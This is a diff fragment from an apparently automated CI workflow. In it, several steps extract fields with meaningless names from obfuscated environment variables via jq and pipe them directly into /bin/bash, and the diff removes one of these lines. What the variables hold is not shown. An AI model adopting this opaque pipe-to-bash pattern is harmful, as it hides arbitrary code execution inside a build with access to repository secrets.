@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$viut4" | jq -r .yshiq161 | /bin/bash
           printf '%s' "$od3" | jq -r .ckc5 | /bin/bash
           echo $juxyo5658 | jq -r .rkf92 | /bin/bash
-          printf '%s' "$lx6" | jq -r .di936 | /bin/bash
           echo $mkeuu52735 | jq -r .zgnib1323 | /bin/bash
 
       - name: Save archive
